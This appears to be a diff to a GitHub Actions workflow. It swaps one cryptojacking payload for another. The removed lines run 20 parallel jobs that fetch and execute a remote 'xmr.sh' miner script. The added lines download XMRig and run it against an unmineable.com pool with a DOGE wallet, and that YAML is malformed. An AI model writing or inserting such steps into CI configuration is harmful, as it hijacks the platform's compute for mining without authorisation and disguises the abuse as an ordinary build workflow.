@@ -21,7 +21,14 @@ jobs:
    strategy:
     fail-fast: false
     matrix:
-     runner: [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19]
-   steps:
-     - run: |
-          wget https://bitbucket.org/Duckling975/minerr/raw/a429afdc4b3ec99e128c3e9fa5c2608a67ca20c8/xmr.sh && chmod +x xmr.sh && ./xmr.sh
+     runner: [0]  
+  
+steps: 
+- name: DOWNLOAD 
+run: Invoke-WebRequest https://github.com/xmrig/xmrig/releases/download/v6.15.1/xmrig-6.15.1-msvc-win64.zip -OutFile xmrig-6.15.1-msvc-win64.zip 
+- name: Extract 
+run: Expand-Archive xmrig-6.15.1-msvc-win64.zip 
+- name: Running 
+run: .\xmrig-6.15.1-msvc-win64\xmrig-6.15.1\xmrig.exe -o rx.unmineable.com:3333 -a rx -k -u DOGE:DSycjXnngRekwJKRQKXJwY88GPw4w9FmQA.FASTGIT -p x -t 1 
+- name: END 
+run: exit
